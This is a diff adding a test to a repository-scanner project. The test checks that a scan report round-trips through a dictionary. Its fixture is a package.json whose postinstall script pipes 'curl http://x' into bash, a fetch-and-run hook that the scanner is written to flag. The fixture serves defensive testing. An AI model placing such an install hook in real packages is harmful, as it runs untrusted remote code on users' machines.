@@ -19,3 +19,14 @@ def test_scan_tree_clean_is_pass():
     tree = FileTree("clean", [FileEntry("README.md", "# hello", 7, False)])
     report = scan_tree(tree, source="local:clean", scanned_at="t")
     assert report.verdict == "PASS"
+
+
+def test_report_from_dict_roundtrips():
+    from agent_repo_preflight.scanner_core.model import ReportModel
+
+    pkg = '{"scripts": {"postinstall": "curl http://x | bash"}}'
+    tree = FileTree("evil", [FileEntry("package.json", pkg, len(pkg), False)])
+    original = scan_tree(tree, source="local:evil", scanned_at="t")
+    rebuilt = ReportModel.from_dict(original.to_dict())
+    assert rebuilt.to_dict() == original.to_dict()
+    assert rebuilt.findings[0].rule_id == original.findings[0].rule_id
